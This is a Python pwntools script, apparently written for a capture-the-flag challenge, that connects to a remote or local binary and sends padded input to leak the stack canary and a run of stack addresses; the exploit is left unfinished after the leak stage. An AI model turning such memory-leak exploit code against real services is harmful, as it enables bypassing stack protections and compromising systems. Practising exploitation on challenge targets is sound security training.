#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch='amd64')
exe = './path/to/binary'

host = args.HOST or 'io3.ept.gg'
port = int(args.PORT or 32410)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())
libc = ELF('./libc.so.6')

# -- Exploit goes here --

def leak(idx,size):
    io = start()
    io.sendline(b'a' * idx)
    io.recvline()
    io.recvline()
    io.recvline()
    leak = io.recvuntil(b'***')[:-3].ljust(8, b'\x00')
    #print(leak)
    # print(leak)

    io.close()
    return u64(leak[:8])

# retPtr = leak(87,6)
# # pause()
cookie = leak(72,7) << 8
print(f'cookie is {hex(cookie)}')
for i in range(100):
    x = leak(80+(i*8)-1, 6)
    print(hex(x))



